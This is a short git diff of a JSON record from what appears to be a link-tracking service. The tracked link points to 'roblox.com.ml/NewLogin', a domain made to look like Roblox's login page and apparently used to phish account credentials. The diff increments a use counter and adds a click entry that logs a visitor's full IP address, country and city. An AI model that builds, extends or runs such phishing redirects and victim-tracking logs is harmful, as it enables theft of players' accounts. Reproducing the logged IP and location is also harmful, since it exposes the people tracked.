@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 813,
+    "useCount": 814,
     "createdBy": "admin",
     "clicks": [
       {
@@ -6616,6 +6616,14 @@
         "city": "Basel",
         "flag": "🇨🇭",
         "countryCode": "CH"
+      },
+      {
+        "timestamp": 1777169448598,
+        "ip": "175.33.220.175",
+        "country": "Australia",
+        "city": "Officer",
+        "flag": "🇦🇺",
+        "countryCode": "AU"
       }
     ]
   },
